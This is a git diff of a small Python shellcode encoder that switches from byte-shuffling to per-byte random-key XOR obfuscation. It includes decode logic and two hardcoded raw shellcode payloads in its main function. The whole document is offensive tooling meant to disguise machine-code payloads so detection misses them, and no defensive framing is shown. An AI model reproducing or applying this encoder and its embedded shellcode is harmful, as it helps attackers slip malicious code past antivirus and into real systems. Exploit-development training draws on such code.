@@ -10,12 +10,15 @@ def encode(shellcode):
     returns: string
     """
     shellcode_output = ""
-    shell = [{count:i.replace("x","\\x")} for count, i in enumerate(shellcode.split("\\")[1:], start=1)]
-    random.shuffle(shell)
-    for p in shell:
-        for key, value in p.items():
-            shellcode_output += hex(key).replace("0x","\\x") + value
-    return shellcode_output
+    shellcode_list = []
+    for i in shellcode.split("\\")[1:]:
+        xor_key = random.randint(0,254)
+        hex_key = hex(xor_key)
+        byte = int(i.replace("x", "0x"), 16)
+        shellcode_list.append(hex_key)
+        shellcode_list.append(hex(xor_key ^ byte))
+
+    return ",".join(shellcode_list)
 
 def decode(encoded_shellcode):
     """decode()
@@ -23,23 +26,22 @@ def decode(encoded_shellcode):
 
     returns: string
     """
-    ilist = [r"0{}".format(y) for y in encoded_shellcode.split("\\")[1:]]
-    decoded = {}
-    for count, code in enumerate(ilist):
-        if count % 2 == 0:
-            decoded[int(code, 0)] = ilist[count+1]
-    return "".join([x[1].replace("0x","\\x") for x in sorted(decoded.items())])
-
+    shellcode_list = encoded_shellcode.split(",")
+    it = iter(shellcode_list)
+    decoded_shellcode = []
+    for x in it:
+        decoded_shellcode.append(hex(int(x, 16) ^ int(next(it), 16)))
+    return ",".join(decoded_shellcode)
 
 def main():
-    orginal_shellcode = r"\xbd\x6b\x98\x93\x2a\xd9\xe9\xd9\x74\x24\xf4\x5f\x31\xc9\xb1\x12\x31\x6f\x12\x03\x6f\x12\x83\x84\x64\x71\xdf\x6b\x4e\x81\xc3\xd8\x33\x3d\x6e\xdc\x3a\x20\xde\x86\xf1\x23\x8c\x1f\xba\x1b\x7e\x1f\xf3\x1a\x79\x77\xc4\x75\x79\xb7\xac\x87\x7a\xb2\x15\x01\x9b\x0c\x03\x41\x0d\x3f\x7f\x62\x24\x5e\xb2\xe5\x64\xc8\x23\xc9\xfb\x60\xd4\x3a\xd3\x12\x4d\xcc\xc8\x80\xde\x47\xef\x94\xea\x9a\x70"
+    orginal_shellcode = r"\xfc\xbb\x1b\x91\xcd\xc8\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x2a\x43\x9f\xa0\x22\x4c\x53\x59\xd2\xbd\xbc\xfb\x4b\x4b\x21\xca\x42\x7a\x66\x9d\x5f\xb0\xe6\xde\x5f\x4a\xe7\xde"
     new_shellcode = encode(orginal_shellcode)
     print("[+] Your encoded shellcode: ")
-    print(new_shellcode.replace("\\x",",0x")[1:])
+    print(new_shellcode)
     print("\n[+] Decoded shellcode:")
     decoded_shellcode = decode(new_shellcode)
-    assert decoded_shellcode == orginal_shellcode
     print(decoded_shellcode)
+    assert decoded_shellcode.replace("0x","\\x").replace(",","") == orginal_shellcode.replace("\\x0", "\\x")
 
 
 if __name__ == "__main__":
